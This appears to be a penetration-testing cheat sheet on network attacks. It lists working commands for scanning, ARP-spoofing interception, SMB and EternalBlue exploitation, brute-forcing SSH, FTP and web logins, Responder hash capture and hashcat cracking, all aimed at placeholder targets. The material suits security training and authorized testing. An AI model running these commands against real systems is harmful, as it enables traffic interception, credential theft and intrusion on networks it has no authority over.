# 04 — Network Attacks

## Scanning & Reconnaissance

```bash
# Host discovery
nmap -sn 192.168.1.0/24
netdiscover -r 192.168.1.0/24

# Full port scan
nmap -p- --min-rate 5000 -T4 TARGET

# Service version + default scripts
nmap -sV -sC -p 22,80,443,445 TARGET

# Vuln scan
nmap --script vuln TARGET
```

## ARP Spoofing / MITM

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poison (arpspoof)
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Capture with Wireshark / tcpdump while poisoning
tcpdump -i eth0 -w capture.pcap
```

## SMB Enumeration & Exploitation

```bash
# Enum
smbclient -L //TARGET -N
smbmap -H TARGET
enum4linux -a TARGET
crackmapexec smb TARGET

# Connect
smbclient //TARGET/share -U username

# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 TARGET
use exploit/windows/smb/ms17_010_eternalblue
```

## FTP

```bash
ftp TARGET
# Try anonymous login
ftp> anonymous / anonymous

nmap --script ftp-anon TARGET
hydra -l admin -P rockyou.txt ftp://TARGET
```

## SSH

```bash
ssh user@TARGET
ssh -i id_rsa user@TARGET

# Brute force
hydra -l root -P rockyou.txt ssh://TARGET
medusa -h TARGET -u root -P rockyou.txt -M ssh
```

## Telnet

```bash
telnet TARGET 23
# If open: banner grab, login attempt
```

## Responder (LLMNR/NBT-NS Poisoning)

```bash
sudo responder -I eth0 -wrf
# Captures NTLMv2 hashes from network

# Crack captured hash
hashcat -a 0 -m 5600 hash.txt rockyou.txt
```

## Password Attacks

```bash
# Hydra
hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -L users.txt -P rockyou.txt ssh://TARGET

# CrackMapExec
crackmapexec smb TARGET -u users.txt -p passwords.txt
crackmapexec smb TARGET -u admin -p 'Password123' --shares
```

## Packet Capture

```bash
tcpdump -i eth0 -w out.pcap
tcpdump -i eth0 port 80 -A
tshark -r capture.pcap -Y "http.request"
```
